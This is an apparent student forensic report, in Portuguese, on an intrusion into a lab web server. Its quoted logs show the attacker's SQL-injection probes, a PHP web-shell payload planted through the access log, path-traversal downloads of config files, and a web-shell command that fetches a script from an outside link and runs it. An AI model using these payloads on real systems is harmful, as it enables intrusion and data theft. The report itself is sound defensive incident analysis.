# Forensic analysis

## Authors:
Tomás Costa - 89016  
João Marques - 89234

## Topics:

1. O que estava implementado a nível de confinamento de aplicações?
2. Qual a sequência de ações que o atacante tomou?
3. Que vulnerabilidades foram exploradas e como?
4. Que alterações foram realizadas e qual o propósito aparente?
5. Foram realmente realizadas transferências? Se sim, como e qual o conteúdo?
6. Porque é que a Firewall externa detetou transferências mas nao detetou as restantes ações?

### O que estava implementado a nível de confinamento de aplicações?

Ao analisar os logs de sistema da máquina (neste caso, analisamos na máquina referência) no ficheiro `syslog` não encontramos nenhuma implementação de um sistema de confinamento de aplicações. 

Por outro lado, realizamos uma procura diretamente por aplicações de confinamento que esperássemos encontrar. Nesse sentido, encontrámos:

* [AppArmor](https://wiki.ubuntu.com/AppArmor): permite confinar programas a um conjunto limitado de recursos, com perfis carregados diretamente no *kernel*. Tem um modo de **enforcement**, no qual confina verdadeiramente a aplicação, e um modo **complain**, no qual apenas regista se uma aplicação violar o seu perfil. 
	```bash
	root@vm /m/reference_root# grep -r "AppArmor" 
	Binary file usr/bin/setpriv matches
	Binary file usr/bin/systemd-analyze matches
	Binary file usr/bin/dbus-daemon matches
	Binary file usr/lib/systemd/systemd matches
	usr/share/doc/systemd/NEWS:        * A new unit file option AppArmorProfile= has been added to
	usr/share/doc/systemd/NEWS:          set the AppArmor profile for the processes of a unit.
	usr/share/doc/systemd/NEWS:        * Support for detecting the IMA and AppArmor security
	usr/share/doc/systemd/NEWS:          this condition already supports SELinux and AppArmor we only
	usr/share/doc/dbus/NEWS:• AppArmor integration has been merged, with features similar to the
	usr/share/doc/dbus/NEWS:  Ubuntu's GetConnectionAppArmorSecurityContext method has been superseded
	usr/share/doc/dbus/NEWS:• AppArmor integration requires libapparmor and optionally libaudit
	usr/share/doc/dbus/NEWS:• Don't duplicate audit subsystem integration if AppArmor and SELinux are
	usr/share/doc/dbus/NEWS:• Log audit events for AppArmor/SELinux policy violations whenever
	usr/share/doc/dbus/NEWS:• On Linux, add support for AppArmor mediation of message sending and
	usr/share/doc/dbus/NEWS:  support), and eavesdropping (a new check, currently AppArmor-specific)
	Binary file usr/share/locale/cs/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/da/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/de/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/es/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/fi/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/fr/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/ja/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/nl/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/pl/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/pt_BR/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/uk/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/vi/LC_MESSAGES/util-linux.mo matches
	Binary file usr/share/locale/zh_CN/LC_MESSAGES/util-linux.mo matches
	```
* [Docker](https://docker.com): permite criar um ambiente virtual no qual a aplicação está confinada a um sistema que apenas contém os serviços que precisa e apenas expõe os necessários. Pela análise do `syslog`, o *driver* foi inicializado, mas não sabemos ainda se foi usado no sistema. 
	```bash
	root@vm /m/reference_root# grep -r "Docker"
	etc/services:docker          2375/tcp                # Docker REST API (plain text)
	etc/services:docker-s        2376/tcp                # Docker REST API (ssl)
	Binary file etc/udev/hwdb.bin matches
	Binary file var/lib/rpm/Packages matches
	Binary file var/cache/dnf/packages.db matches
	Binary file var/cache/dnf/updates.solv matches
	Binary file var/cache/dnf/updates-filenames.solvx matches
	Binary file var/cache/dnf/updates-presto.solvx matches
	Binary file var/cache/dnf/updates-updateinfo.solvx matches
	Binary file var/cache/dnf/fedora.solv matches
	Binary file var/cache/dnf/fedora-filenames.solvx matches
	Binary file usr/lib/systemd/systemd-pull matches
	Binary file usr/lib/python3.4/site-packages/sos/plugins/__pycache__/docker.cpython-34.pyc matches
	Binary file usr/lib/python3.4/site-packages/sos/plugins/__pycache__/docker.cpython-34.pyo matches
	usr/lib/python3.4/site-packages/sos/plugins/docker.py:class Docker(Plugin, RedHatPlugin):
	usr/lib/python3.4/site-packages/sos/plugins/docker.py:    """Docker information
	usr/lib/python3.4/site-packages/sos/plugins/docker.py:class RedHatDocker(Plugin, RedHatPlugin):
	usr/lib/udev/rules.d/85-nm-unmanaged.rules:# in another net namespace and managed by libvirt, Docker or the like.
	usr/lib/udev/hwdb.d/20-pci-vendor-model.hwdb: ID_MODEL_FROM_DATABASE=82557/8/9/0/1 Ethernet Pro 100 (PCI 	FastEther LAN on Docker)
	usr/share/doc/curl/CHANGES:  for Docker[4] which uses a special URL scheme (though the name contains
	usr/share/doc/systemd/NEWS:        * Docker containers are now detected as a separate type of
	usr/share/hwdata/pci.ids:		1179 0002  PCI FastEther LAN on Docker
	usr/share/vim/vim74/filetype.vim:" Dockerfile
	usr/share/vim/vim74/filetype.vim:au BufNewFile,BufRead Dockerfile		setf dockerfile
	usr/share/vim/vim74/ftplugin/dockerfile.vim:" Language:	Dockerfile
	usr/share/vim/vim74/syntax/dockerfile.vim:" dockerfile.vim - Syntax highlighting for Dockerfiles
	``` 
* [Chroot](https://en.wikipedia.org/wiki/Chroot): isola o processo num diretório que aparenta ser o *root* e impede que o mesmo aceda a ficheiros para os quais não tem permissão.
	```
	root@vm /m/reference_root# grep -r "Chroot"
	etc/ssh/sshd_config:#ChrootDirectory none
	Binary file var/cache/dnf/updates-filenames.solvx matches
	Binary file usr/sbin/sshd matches
	Binary file usr/lib64/librpm.so.7.0.0 matches
	Binary file usr/lib64/httpd/modules/mod_unixd.so matches
	usr/share/httpd/manual/mod/directives.html:<li><a href="mod_unixd.html#chrootdir">ChrootDir</a></li>
	usr/share/httpd/manual/mod/mod_unixd.html:<li><img alt="" src="../images/down.gif" /> <a 	href="#chrootdir">ChrootDir</a></li>
	usr/share/httpd/manual/mod/mod_unixd.html:<div class="directive-section"><h2><a name="ChrootDir" 	id="ChrootDir">ChrootDir</a> <a name="chrootdir" id="chrootdir">Directive</a></h2>
	usr/share/httpd/manual/mod/mod_unixd.html:<tr><th><a href="directive-dict.html#Syntax">Syntax:</a></th><td>		<code>ChrootDir <var>/path/to/directory</var></code></td></tr>
	usr/share/httpd/manual/mod/quickreference.html:<tr><td><a href="mod_unixd.html#chrootdir">ChrootDir 	<var>/path/to/directory</var></a></td><td></td><td>s</td><td>B</td></tr><tr><td class="descr" 		colspan="4">Directory for apache to run chroot(8) after startup.</td></tr>(AuthConfig|IncludesNOEXEC|ExecCGI|FollowSymLinks|MultiViews|Includes|Indexes|SymLinksIfOwnerMatch)\b/i;var ALL_KEYWORDS=[CPP_KEYWORDS,CSHARP_KEYWORDS,JSCRIPT_KEYWORDS,PERL_KEYWORDS+
	usr/share/vim/vim74/syntax/aptconf.vim:	\ Build-Options Chroot-Directory ConfigurePending FlushSTDIN
	usr/share/vim/vim74/syntax/sshdconfig.vim:syn keyword sshdconfigKeyword ChrootDirectory
	Binary file usr/libexec/mysqld matches
	Binary file srv/chroot-mariadb/usr/libexec/mysqld matches
	```
Estas informações permitem-nos apenas concluir que estas aplicações estão presentes no sistema, não que estão a ser aplicadas. A ausência de *logs* relativos a estas aplicações no ficheiro `syslog` permite-nos assumir que não foram aplicadas no sistema em produção, apesar de instaladas. 

No caso da aplicação **Chroot**, como verificamos a existência de ficheiros como `srv/chroot-mariadb/usr/libexec/mysqld`, assumimos que tenha sido aplicado confinamento à aplicação **MariaDB**/**MySQL**.

Verificámos, também, por análise de vários ficheiros, como explicado posteriormente, que os vários serviços estavam divididos entre diferentes utilizadores do sistema. Apesar de isto ser normal e o comportamento por defeito destas aplicações, produz certo nível de confinamento das aplicações.

### Qual a sequência de ações que o atacante tomou?

Para determinar a seguência de ações do atacante, baseamo-nos na diferença entre os diretórios da máquina de referência e da máquina atacada:
```
Files reference_root/etc/httpd/logs/access_log and hacked_root/etc/httpd/logs/access_log differ
Files reference_root/etc/httpd/logs/error_log and hacked_root/etc/httpd/logs/error_log differ
Files reference_root/etc/httpd/logs/ssl_error_log and hacked_root/etc/httpd/logs/ssl_error_log differ
Files reference_root/etc/issue and hacked_root/etc/issue differ
Files reference_root/lib/issue and hacked_root/lib/issue differ
Files reference_root/lib/os.release.d/issue-fedora and hacked_root/lib/os.release.d/issue-fedora differ
Files reference_root/srv/chroot-mariadb/var/log/mariadb/mariadb.log and hacked_root/srv/chroot-mariadb/var/log/mariadb/mariadb.log differ
Only in hacked_root/srv/chroot-mariadb/var/tmp: x.txt
Files reference_root/usr/lib/issue and hacked_root/usr/lib/issue differ
Files reference_root/usr/lib/os.release.d/issue-fedora and hacked_root/usr/lib/os.release.d/issue-fedora differ
Files reference_root/var/cache/dnf/expired_repos.json and hacked_root/var/cache/dnf/expired_repos.json differ
Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c: metalink.xml
Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 0fa09bb5f82e4a04890b91255f4b34360e38ede964fe8328f7377e36f06bad27-primary.xml.gz
Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 86a9c4f451ecfec1633638a477b6acef805fd6606978c7bd3c67434034f915a8-comps-f23.xml.xz
Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 874f220caf48ccd307c203772c04b8550896c42a25f82b93bd17082d69df80db-filelists.xml.gz
Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: repomd.xml
Only in reference_root/var/cache/dnf: fedora-filenames.solvx
Only in reference_root/var/cache/dnf: fedora.solv
Only in hacked_root/var/cache/dnf: metadata_lock.pid
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6: metalink.xml
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 01218690d29f35728973edd4587bfd73dbd6ba430808f1adc144655ccf647dfa-prestodelta.xml.xz
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 3d51dd4a9499400fc360d1112e5d7d52c5a521bd08027033db5ff940fed7d468-comps-f23.xml.xz
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 455209181fb97f3cdd54b73e729af34d238bbb3585ab23da7fcdc7ea1651bbd5-updateinfo.xml.xz
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: af3c46471b1d685f22c72a5e16d7383d333fb89db278711b2b8c794e29a91eaa-filelists.xml.gz
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: f0645865ea711dc4be0006e0fb110f5e24bfb29b48cb826a747439b7f82d5251-primary.xml.gz
Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: repomd.xml
Only in reference_root/var/cache/dnf: updates-filenames.solvx
Only in reference_root/var/cache/dnf: updates-presto.solvx
Only in reference_root/var/cache/dnf: updates.solv
Only in reference_root/var/cache/dnf: updates-updateinfo.solvx
File reference_root/var/lib/gssproxy/default.sock is a socket while file hacked_root/var/lib/gssproxy/default.sock is a socket
Files reference_root/var/lib/mlocate/mlocate.db and hacked_root/var/lib/mlocate/mlocate.db differ
Only in reference_root/var/lib/NetworkManager: dhclient-4c619efa-fd8b-445d-a5dc-eec91932d461-enp0s3.lease
Only in hacked_root/var/lib/NetworkManager: dhclient-654f0ae0-663a-4ed2-bc13-5332c11742e6-enp0s3.lease
Only in hacked_root/var/lib/NetworkManager: dhclient-7625647c-766a-4ce2-87e2-b500b39e69ad-enp0s8.lease
Only in reference_root/var/lib/NetworkManager: dhclient-a98b76e8-8bef-4838-966b-6c9095e68d76-enp0s3.lease
Only in hacked_root/var/lib/NetworkManager: dhclient-ec763d29-5b76-4030-b343-61600bb2933e-enp0s3.lease
Files reference_root/var/lib/NetworkManager/timestamps and hacked_root/var/lib/NetworkManager/timestamps differ
Files reference_root/var/lib/rpm/__db.001 and hacked_root/var/lib/rpm/__db.001 differ
Files reference_root/var/lib/rpm/__db.002 and hacked_root/var/lib/rpm/__db.002 differ
Files reference_root/var/lib/rpm/__db.003 and hacked_root/var/lib/rpm/__db.003 differ
Files reference_root/var/lib/rsyslog/imjournal.state and hacked_root/var/lib/rsyslog/imjournal.state differ
Files reference_root/var/lib/systemd/random-seed and hacked_root/var/lib/systemd/random-seed differ
Files reference_root/var/log/audit/audit.log and hacked_root/var/log/audit/audit.log differ
Files reference_root/var/log/btmp and hacked_root/var/log/btmp differ
Files reference_root/var/log/cron and hacked_root/var/log/cron differ
Files reference_root/var/log/dnf.librepo.log and hacked_root/var/log/dnf.librepo.log differ
Files reference_root/var/log/dnf.log and hacked_root/var/log/dnf.log differ
Files reference_root/var/log/dnf.rpm.log and hacked_root/var/log/dnf.rpm.log differ
Files reference_root/var/log/hawkey.log and hacked_root/var/log/hawkey.log differ
Files reference_root/var/log/httpd/access_log and hacked_root/var/log/httpd/access_log differ
Files reference_root/var/log/httpd/error_log and hacked_root/var/log/httpd/error_log differ
Files reference_root/var/log/httpd/ssl_error_log and hacked_root/var/log/httpd/ssl_error_log differ
Files reference_root/var/log/journal/b74ff8c513354faa8633ee944bc76c73/system.journal and hacked_root/var/log/journal/b74ff8c513354faa8633ee944bc76c73/system.journal differ
Files reference_root/var/log/maillog and hacked_root/var/log/maillog differ
Files reference_root/var/log/mariadb/mariadb.log and hacked_root/var/log/mariadb/mariadb.log differ
Files reference_root/var/log/messages and hacked_root/var/log/messages differ
Files reference_root/var/log/secure and hacked_root/var/log/secure differ
Files reference_root/var/log/syslog and hacked_root/var/log/syslog differ
Files reference_root/var/log/wtmp and hacked_root/var/log/wtmp differ
Files reference_root/var/www/html/images/road.jpg and hacked_root/var/www/html/images/road.jpg differ
Only in hacked_root/var/www/html: r.php
```

#### Análise dos ficheiros diferentes
 
Por análise do ficheiro `etc/httpd/logs/access_log`, verificamos que o atacante começou por realizar vários ataques por SQL Injection, como por exemplo:
```
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=7511 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2.%27%28.%29%22%29%2C%28%29 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%27vQDNvJ%3C%27%22%3EkdZcIq HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%29%20AND%204107%3D3069%20AND%20%283913%3D3913 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%20AND%207309%3D1070 HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%20AND%202497%3D1724--%20GrhU HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%27%29%20AND%203989%3D8856%20AND%20%28%27Mvif%27%3D%27Mvif HTTP/1.1" 200 -
192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] "GET /products.php?type=2%27%20AND%207213%3D4313%20AND%20%27EilI%27%3D%27EilI HTTP/1.1" 200 -
```
Um dos principais e mais impactantes ataques foi induzido pela seguinte linha:
```
192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] "GET /index.php?a=<?php system($_GET['cmd']);?> HTTP/1.1" 200 1516
```
Esta injeção de código *PHP* permite criar uma **backdoor**, pela qual pode ser possível aceder a uma *shell* do sistema.
Depois de criado o *backdoor*, o atacante descarregou um *script*	e executou-o.
```
192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=ls%20/ HTTP/1.1" 200 218571
192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=find%20/ HTTP/1.1" 200 3573861
192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=find%20/%20-perm%20-4000 HTTP/1.1" 200 219136
192.168.56.1 - - [14/Dec/2019:01:39:11 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=wget%20https://bit.ly/2LRYDSQ%20-O%20/tmp/steg_drop.py HTTP/1.1" 200 218909
192.168.56.1 - - [14/Dec/2019:01:39:11 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=find%20/ HTTP/1.1" 200 3580340
192.168.56.1 - - [14/Dec/2019:01:39:12 +0000] "GET /display.php?type=1&lang=/var/log/httpd/access_log&cmd=/opt/venv/bin/python3%20/tmp/steg_drop.py HTTP/1.1" 200 219228
```
O atacante acedeu também a várias tabelas da base de dados, incluido tabelas de sistema, e descarregou vários ficheiros de configuração, obtendo informação que lhe permitiu injetar o código referido.

Ao analisar o ficheiro `etc/httpd/logs/error_log` notamos que ocorreram vários erros causados por tentativas de acesso a vários ficheiros por parte do atacante que, sendo feitos pelo utilizador **Apache** a dados do utilizador **MySQL**, resultavam em erros de permissão de acesso.

No ficheiro `srv/chroot-mariadb/usr/libexec/mysqld` não encontramos nada anormal, pelo que assumimos que nada foi atacado nesta aplicação em particular.

Comprovámos também que, no diretório `srv/chroot-mariadb/var/tmp`, estava presente o ficheiro `x.txt`, que, conforme analisado em `etc/httpd/logs/access_log`, foi inserido:
```
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /details.php?prod=1%20union%20select%201,2,3,4,'hello'%20into%20outfile%20'/var/tmp/x.txt' HTTP/1.1" 200 1673
```

Ao analisar o ficheiro `var/log/secure` vimos que o atacante efectuou várias tentativas de login por **ssh** à *backdoor* criada anteriormente:
```
Dec 14 01:39:06 localhost sshd[1905]: Invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1
Dec 14 01:39:06 localhost sshd[1905]: input_userauth_request: invalid user <?php system($_GET["cmd"]);?> [preauth]
Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): check pass; user unknown
Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1
Dec 14 01:39:10 localhost sshd[1905]: Failed password for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2
Dec 14 01:39:10 localhost sshd[1905]: error: maximum authentication attempts exceeded for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2 [preauth]
Dec 14 01:39:10 localhost sshd[1905]: Disconnecting: Too many authentication failures [preauth]
``` 

Verificamos também que foi criado o ficheiro `/var/www/html/r.php`:
```php
<?php
echo "Road Runner was here";
?>
```
Este ficheiro indica que o user conseguiu acesso a uma terminal, pois devido ao **Chroot** no servidor de base de dados, não era possivel o user escrever ficheiros na pasta var/html/www, no entanto como vimos no exemplo em cima, o user conseguiu escrever nessa pasta.

Não encontramos, no entanto, nenhuma referência à criação deste ficheiro nos *logs*.
Assumimos, assim, que o atacante ganhou acesso à máquina através do *backdoor* previamente mencionado e pôde criar o ficheiros através de uma sessão de utilizador, ou pôde apagar os logs que registaram os seus movimentos.

### Que vulnerabilidades foram exploradas e como?

O atacante explorou a vulnerabilidade a **SQL Injection** no *PHP* que tinha sido reportada na auditoria realizada. Esta vulnerabilidade foi explorada de forma a **visualizar** e **descarregar** informação do sistema, assim como **inserir** outros dados e *scripts*. 

Por outro lado, aproveitou a falta de **confinamento** das aplicações e explorou esta vulnerabilidade de forma a aceder a todo o sistema a partir da vulnerabilidade persente no servidor *Apache*.

Além disso, aproveitou o facto da máquina do servidor web ter um servidor **ssh** aberto com autenticação por password (vulnerável a ataques por *brute force*) e de o servidor da base de dados estar na mesma máquina.

Outra vulnerabilidade explorada tem que ver com a arquitetura do sistema. A má aplicação da *firewall*, como explicado no último ponto do relatório, e o facto de o servidor web poder fazer pedidos a serviços externos aparentemente sem controlo levaram a que tenha sido possível descarregar dados, como *scripts*, de fontes desconhecidas, e assim injetar mais código malicioso.

#### Quais o atacante tentou explorar mas foram barradas?

Verificamos, principalmente por análise do ficheiro `etc/httpd/logs/error_log`, que o atacante tentou aproveitar as vulnerabilidades no *PHP* para aceder à base de dados e a outros dados de sistema, mas não conseguiu devido ao **confinamento** de cada serviço a um utilizador diferente e à limitação de **permissões** para cada ficheiro.

Também não foi possível inserir ficheiros e dados em determinados diretórios do sistema pela mesma razão.

### Que alterações foram realizadas e qual o propósito aparente?

Uma das alterações principais foi realizada na pasta `var/www/html/images` , à imagem road.jpg. Esta nova versão da imagem contêm uma mensagem escondida na imagem, algo denominado esteganografia. Ao dar decode da imagem usando uma [ferramenta](http://stylesuxx.github.io/steganography/), conseguimos extrair a mensagem no inicio da imagem que diz:
```
Parabéns!
https://elearning.ua.pt/mod/assign/view.php?id=647250
```
Esta alteração foi possivel porque o utilizador descarregou um ficheiro pelo [link](https://bit.ly/2LRYDSQ%20). Este script, que não conseguimos transferir, foi a arma do ataque e realizou as mudanças na imagem atraves de estaganografia. O link já não se encontra disponivel e como o script foi colocado no diretório /tmp/, já não está presente no sistema.

Por outro lado, foram adicionados os ficheiros `/var/www/html/r.php` e `srv/chroot-mariadb/var/tmp/x.txt`, conforme explicado anteriormente.

### Foram realmente realizadas transferências? Se sim, como e qual o conteúdo?

Sim foram realizadas transferências, o atacante deve ter notado que ao clicarmos no catálogo de carros, o método para descarregar ficheiros era através de um php denominado **downloads.php**, pelo que o user tentou aceder outros ficheiros através desse link e conseguiu com sucesso, visto que nao havia confinamento a nivel do diretório de downloads e ele pode voltar atras nos diretórios.

```
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=Brochure.pdf HTTP/1.1" 200 13305
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../index.php HTTP/1.1" 200 115
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../x.txt HTTP/1.1" 200 41
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../config.php HTTP/1.1" 200 130
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../display.php HTTP/1.1" 200 1557
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php HTTP/1.1" 200 41
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=Brochure.pdf HTTP/1.1" 200 13305
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../index.php HTTP/1.1" 200 115
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../x.txt HTTP/1.1" 200 41
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../config.php HTTP/1.1" 200 130
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../products.php HTTP/1.1" 200 117
192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] "GET /download.php?item=../display.php HTTP/1.1" 200 1557
```
Apesar de as respostas terem sido todas de sucesso (200), nem todos os ficheiros foram transferidos, então analisamos no wireshark os ficheiros que o utilizador recebeu e chegamos a conclusão que ele transferiu todos exceto o ficheiro x.txt, visto que este não existia no sistema.
E como conseguimos ver, o atacante conseguiu transferir alguns ficheiros criticos de sistema como **config.php** e **display.php** que lhe permitiram visualizar informação **crítica** do sistema.

Por outro lado, o atacante pode **visualizar** o nome e conteúdo de muitas tabelas da base de dados graças à vulnerabilidade a SQL Injection referida anteriormente.

### Porque é que a Firewall externa detetou transferências mas nao detetou as restantes ações?

Ao pesquisarmos nos ficheiros do sistema, conseguimos encontrar dois ficheiros que são de extrema importancia, pois regem as configurações das firewalls.

```bash
user@vm:/mnt/hacked_root$ sudo cat root/shieldsup.sh
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p icmp -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -j DROP
iptables -A FORWARD -j DROP
user@vm:/mnt/hacked_root$ sudo cat root/shieldsdown.sh
[sudo] password for user: 
iptables -A INPUT -j ACCEPT
iptables -A FORWARD -j ACCEPT
iptables --flush
```

Através da análise destas configurações do iptables, conseguimos perceber que a configuração inicial do shieldsup.sh aceita:  
* Pacotes do tipo ICMP
* Pacotes vindo da interface lo
* Pacotes novos TCP ao porto 80
E recusa:  
 * Tudo o que não tiver sido declarado anteriormente, logo adotando uma politica de whitelisting.

Já o shieldsdown.sh parece aceitar todo o tipo de pacotes, dai o nome dos escudos estarem em baixo, pois a proteção oferecida foi retirada.

O facto de termos encontrado estes ficheiros na maquina do servidor web leva-nos a crer que, no sistema em produção, a máquina que actua como firewall externa é a mesma que o próprio servidor, o que potenciou o acesso descrito anteriormente sem qualquer controlo.

Ao analisar os pacotes capturados pela firewall, verificamos que, por exemplo, o ficheiro `steg_drop.py`, obtido através do comando *wget* a uma página externa, não foi detetado. Isto pode dever-se ao facto de a firewall não estar a implementar, efetivamente, uma defesa em perímetro, e assim passar por alto muito tráfego da máquina para outros sites. Portanto, outro tráfego criado pelo atacante para outras ações pode facilmente não ter sido detetado.

Suspeitamos que o atacante tenha inicialmente realizado transferências e dai as podermos visualizar no tráfego da firewall externa.

No entanto, tendo criada a **backdoor**, o user ganhou acesso ao sistema por completo, executando comandos numa sessão *ssh* encriptada e, portanto, impossível de analisar pela firewall. Por outro lado, pôde remover as limitações da firewall uma vez dentro da máquina.

